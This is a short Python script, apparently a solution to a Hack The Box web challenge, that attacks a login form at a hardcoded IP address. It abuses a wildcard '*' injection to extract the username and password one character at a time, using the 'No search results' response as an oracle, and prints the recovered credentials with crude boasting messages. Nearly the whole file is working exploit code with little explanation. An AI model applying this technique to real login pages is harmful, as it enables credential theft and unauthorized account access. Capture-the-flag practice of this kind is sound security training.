# This script bruteforces login details to try and figure out
# the username and the password

# Original Writeup
# https://fergustran1008.medium.com/writeup-phonebook-webchallenge-htb-87772510a853

import requests
from string import printable
import re

# Remove * from printable chars list
# If you don't remove * then the script doesn't stop
magic = re.sub(r'[*]','',printable)


url = "http://157.245.33.77:30680/login"
myobj = { 'username':'somevalue','password':'*' }
result = ''

flag = 1

while flag == 1:
    flag = 0
    for char in magic:
        myobj['username'] = result + char + '*'
        r = requests.post(url, data = myobj)
        if ('No search results' in r.text):
            result += char
            flag = 1
            print(result)
            break
        
print(f"DONE, you sexy devil!\nUsername found: {result}")

myobj2 = { 'username':f'{result}','password':'somevalue' }
result2 = ''

flag2 = 1

while flag2 == 1:
    flag2 = 0
    for char in magic:
        myobj2['password'] = result2 + char + '*'
        r = requests.post(url, data = myobj2)
        if ('No search results' in r.text):
            result2 += char
            flag2 = 1
            print(result2)
            break
        
print(f"\nDONE AGAIN, you sexy devil!\nPassword found: {result2}\n\n")
print(f"Ok ok, I will make things easy for you\nUsername: {result}\nPassword: {result2}")
